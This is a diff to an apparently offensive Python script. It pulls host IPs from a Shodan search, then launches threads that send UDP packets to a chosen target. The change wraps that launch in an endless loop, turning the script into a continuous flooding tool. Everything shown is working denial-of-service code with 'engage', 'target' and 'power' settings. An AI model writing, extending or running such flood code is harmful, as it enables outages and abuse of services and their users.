@@ -117,18 +117,19 @@ def main():
     load_shodan_api_key()
     results = search_shodan(SHODAN_API_KEY)
     if engage.startswith('y'):
-        threads = []
-        iface = 'Atheros AR9271 Wireless Network Adapter'  # Specify the interface outside the loop
-        bot_list = [result['ip_str'] for result in results['matches']]
-        for bot_ip in bot_list:
-            thread = threading.Thread(target=send_udp_packet, args=(target, target_port, data, getdata, power, iface))
-            threads.append(thread)
-            thread.start()
+        while(True):
+            threads = []
+            iface = 'Atheros AR9271 Wireless Network Adapter'  # Specify the interface outside the loop
+            bot_list = [result['ip_str'] for result in results['matches']]
+            for bot_ip in bot_list:
+                thread = threading.Thread(target=send_udp_packet, args=(target, target_port, data, getdata, power, iface))
+                threads.append(thread)
+                thread.start()
 
-        # Wait for all threads to complete
-        for thread in threads:
-            thread.join()
-            print('[•] Task complete! Exiting Platform.  Have a wonderful day.')
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                print('[•] Task complete! Exiting Platform.  Have a wonderful day.')
 
     else:
         print('[✘] Error: %s not engaged!' % target)
